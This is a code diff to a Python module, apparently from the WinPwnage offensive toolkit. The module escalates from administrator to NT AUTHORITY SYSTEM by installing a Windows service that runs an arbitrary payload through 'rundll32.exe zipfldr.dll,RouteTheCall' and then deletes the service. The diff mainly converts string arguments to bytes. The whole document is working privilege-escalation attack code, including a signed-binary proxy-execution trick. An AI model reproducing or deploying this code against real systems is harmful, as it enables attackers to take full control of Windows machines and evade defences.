@@ -5,7 +5,7 @@ import os
 
 elevate_service_info = {
 	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using Windows Service (non interactive)",
-	"Id": "7",
+	"Id": "6",
 	"Type": "Elevation",
 	"Fixed In": "99999" if information().admin() == True else "0",
 	"Works From": "7600",
@@ -26,19 +26,18 @@ def elevate_service(payload):
 		return False
 
 	if payloads().exe(payload):
-		servicename = "WinPwnage"
-		localhost = "\\\\localhost"
+		servicename = bytes(r"WinPwnage", encoding="utf-8")
+		localhost = bytes(r"\\localhost", encoding="utf-8")
 
 		print_info("Installing service")
-		schSCManager = OpenSCManager(localhost, "ServicesActive", 0x0001 | 0x0002)
+		schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
 		if not schSCManager:
 			print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
 			return False
 
 		schService = CreateService(schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 
-									0x00000003, 0x00000000, "rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(), "zipfldr.dll"),
-									#0x00000003, 0x00000000, "{cmd_path} /c {payload}".format(cmd_path=os.path.join(information().system_directory(), "cmd.exe"),
-									payload=payload), None, None, None, None, None)
+						0x00000003, 0x00000000, bytes("rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(),
+						"zipfldr.dll"), payload=payload), encoding="utf-8"), None, None, None, None, None)
 		if not schService:
 			print_error("Error while installing our service using CreateService: ({error})".format(error=GetLastError()))
 			return False
@@ -48,7 +47,7 @@ def elevate_service(payload):
 		CloseServiceHandle(schSCManager)
 		CloseServiceHandle(schService)
 
-		schSCManager = OpenSCManager(localhost, "ServicesActive", 0x0001 | 0x0002)
+		schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
 		if not schSCManager:
 			print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
 			return False
@@ -64,7 +63,7 @@ def elevate_service(payload):
 		CloseServiceHandle(svcHandle)
 
 		print_info("Performing cleanup")
-		schSCManager = OpenSCManager(localhost, "ServicesActive", 0x0001 | 0x0002)
+		schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
 		if not schSCManager:
 			print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
 			return False
